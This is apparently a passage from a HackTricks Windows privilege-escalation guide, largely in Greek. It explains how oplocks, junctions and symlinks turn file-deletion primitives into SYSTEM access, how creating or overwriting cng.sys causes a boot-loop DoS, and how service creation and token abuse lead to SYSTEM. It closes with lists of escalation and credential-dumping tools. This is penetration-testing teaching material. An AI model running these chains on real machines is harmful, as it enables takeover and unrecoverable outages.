Η βασική MSI rollback τεχνική (η προηγούμενη) υποθέτει ότι μπορείς να διαγράψεις έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Τι γίνεται όμως αν η ευπάθειά σου επιτρέπει μόνο **arbitrary file deletion** ?

Θα μπορούσες να εκμεταλλευτείς τα **NTFS internals**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **index metadata** του φακέλου.

Άρα, αν **διαγράψεις το `::$INDEX_ALLOCATION` stream** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το filesystem.

Μπορείς να το κάνεις αυτό χρησιμοποιώντας standard file deletion APIs όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρότι καλείς ένα API διαγραφής *file*, αυτό **διαγράφει το ίδιο το folder**.

### Από Folder Contents Delete σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν επιτρέπει να διαγράψεις arbitrary files/folders, αλλά **επιτρέπει τη διαγραφή του *περιεχομένου* ενός folder υπό τον έλεγχο του attacker**;

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- Το oplock **pauses execution** όταν ένα privileged process προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίησε τη διαδικασία SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διαδικασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει το περιεχόμενό τους.
- Όταν φτάσει στο `file1.txt`, το **oplock ενεργοποιείται** και δίνει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνησε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψεις το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετέτρεψε το `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει το εσωτερικό NTFS stream που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Step 5: Release the oplock
- Το SYSTEM process συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από Arbitrary Folder Create σε Permanent DoS

Εκμεταλλεύσου ένα primitive που σου επιτρέπει να **δημιουργήσεις έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείς να γράψεις αρχεία** ή **να ορίσεις weak permissions**.

Δημιούργησε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **critical Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στο `cng.sys` kernel-mode driver.
- Αν το **προ-δημιουργήσεις ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν το πραγματικό driver στο boot.
- Έπειτα, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά το boot.
- Βλέπουν τον φάκελο, **αποτυγχάνουν να επιλύσουν το πραγματικό driver**, και **κρασάρουν ή σταματούν το boot**.
- Δεν υπάρχει **fallback**, και **καμία ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. boot repair ή πρόσβαση στο δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν μια **privileged service** γράφει logs/exports σε ένα path που διαβάζεται από ένα **writable config**, ανακατεύθυνε αυτό το path με **Object Manager symlinks + NTFS mount points** για να μετατρέψεις το privileged write σε arbitrary overwrite (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Το config που αποθηκεύει το target path είναι writable από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point σε `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged operation που γράφει σε αυτό το path (log, export, report).

**Example chain**
1. Διάβασε το config για να ανακτήσεις το privileged log destination, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατεύθυνε το path χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε το privileged component να γράψει το log (π.χ. ο admin ενεργοποιεί "send test SMS"). Η εγγραφή πλέον καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Εξετάστε τον overwritten target (hex/PE parser) για να επιβεβαιώσετε την corruption· το reboot αναγκάζει τα Windows να φορτώσουν το tampered driver path → **boot loop DoS**. Αυτό γενικεύεται επίσης σε οποιοδήποτε protected file θα ανοίξει για write μια privileged service.

> Το `cng.sys` συνήθως φορτώνεται από `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει ένα copy στο `C:\Windows\System32\cng.sys` μπορεί να επιχειρηθεί πρώτο, καθιστώντας το ένα αξιόπιστο DoS sink για corrupt data.



## **From High Integrity to System**

### **New service**

Αν ήδη εκτελείστε σε ένα High Integrity process, το **path to SYSTEM** μπορεί να είναι εύκολο απλώς **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα, γιατί θα σκοτωθεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από ένα High Integrity process θα μπορούσατε να προσπαθήσετε να **ενεργοποιήσετε τα registry entries του AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες για τα registry keys που εμπλέκονται και για το πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε ένα ήδη High Integrity process), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (όχι protected processes) με το SeDebug privilege, **να αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με εκείνο το token**.\
Χρησιμοποιώντας αυτήν την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία που εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε SYSTEM processes χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που υλοποιεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και στη συνέχεια στη δημιουργία/κατάχρηση ενός service ώστε να γράψει σε αυτό το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **impersonate το token** του client του pipe (του service), αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για name pipes θα πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να περάσετε από high integrity σε System χρησιμοποιώντας name pipes θα πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **hijack ένα dll** που **φορτώνεται** από μια **διεργασία** που εκτελείται ως **SYSTEM** θα μπορείτε να εκτελέσετε αυθαίρετο code με εκείνα τα permissions. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι πολύ **πιο εύκολο να επιτευχθεί από ένα high integrity process** καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση των dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να μεταγλωττίσετε το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο θύμα host μπορείτε να κάνετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
